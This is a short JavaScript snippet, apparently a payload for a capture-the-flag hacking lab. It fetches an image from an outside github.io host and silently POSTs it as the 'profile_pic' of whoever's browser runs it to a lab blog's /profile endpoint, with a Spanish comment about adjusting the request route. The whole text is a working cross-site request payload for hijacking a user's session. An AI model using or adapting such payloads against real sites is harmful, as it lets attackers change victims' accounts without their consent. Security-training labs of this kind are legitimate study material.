fetch('https://matiaselima.github.io/ctf/133954957131333153.jpg')
  .then(res => res.blob())
  .then(blob => {
      var formData = new FormData();
      formData.append("bio", "None"); 
      formData.append("profile_pic", blob, "133954957131333153.jpg");
      fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
        method: 'POST',
        body: formData
      });
  });

// Recuerda poner la ruta correcta de la petición original aquí


